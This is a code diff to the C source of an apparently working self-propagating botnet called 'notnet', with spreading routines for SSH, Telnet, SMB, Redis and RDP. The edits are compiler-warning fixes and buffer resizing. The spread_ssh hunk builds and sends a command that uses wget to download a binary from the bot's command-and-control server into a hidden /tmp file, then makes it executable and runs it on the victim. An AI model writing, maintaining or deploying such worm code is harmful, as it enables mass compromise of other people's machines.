@@ -208,13 +208,16 @@ int spread_ssh(notnet_bot_t *bot, const char *ip, uint16_t port) {
                          ip, port, default_users[u], "***REDACTED***");
                 
                 /* Download and install binary */
-                char cmd[512];
-                char dl_url[512];
+                char cmd[1024];
+                char dl_url[1024];
                 snprintf(dl_url, sizeof(dl_url),
-                    "http://%s:%d/bot/%s",
+                    "http://%.250s:%d/bot/%s",
                     bot->c2_http.server, PAYLOAD_DL_PORT, "notnet");
+                /* %.500s: dl_url is already capped at ~280 bytes by the
+                 * .250s precision above, but GCC can't see through the
+                 * intermediate buffer, so cap again to silence truncation. */
                 snprintf(cmd, sizeof(cmd),
-                    "wget %s -O /tmp/.notnet && chmod +x /tmp/.notnet && /tmp/.notnet &",
+                    "wget %.500s -O /tmp/.notnet && chmod +x /tmp/.notnet && /tmp/.notnet &",
                     dl_url);
                 /* SECURITY FIX (#15): Send command over the established socket */
                 send_command(sock_fd, "ssh", cmd);
@@ -317,6 +320,8 @@ int spread_telnet(notnet_bot_t *bot, const char *ip, uint16_t port) {
 
 /* ── SMB Spreading ────────────────────────────────────────── */
 int try_login_smb(const char *ip, uint16_t port, const char *user, const char *pass) {
+    (void)user;
+    (void)pass;
     /* Simple SMB connection attempt */
     int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
     if (sock < 0) return -1;
@@ -479,6 +484,8 @@ int spread_redis(notnet_bot_t *bot, const char *ip, uint16_t port) {
 
 /* ── RDP Spreading ────────────────────────────────────────── */
 int try_login_rdp(const char *ip, uint16_t port, const char *user, const char *pass) {
+    (void)user;
+    (void)pass;
     /* Simple RDP connection attempt */
     int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
     if (sock < 0) return -1;
@@ -600,17 +607,7 @@ int scan_port(notnet_bot_t *bot, const char *ip, uint16_t port) {
     
     /* Port is open */
     bot->scan_count++;
-    
-    /* Determine service */
-    uint8_t service = 0;
-    switch (port) {
-        case 22:  service = SPREAD_SSH; break;
-        case 23:  service = SPREAD_TELNET; break;
-        case 445: service = SPREAD_SMB; break;
-        case 6379: service = SPREAD_REDIS; break;
-        case 3389: service = SPREAD_RDP; break;
-    }
-    
+
     log_info("port open: %s:%d", ip, port);
     
     /* Spread to this port */
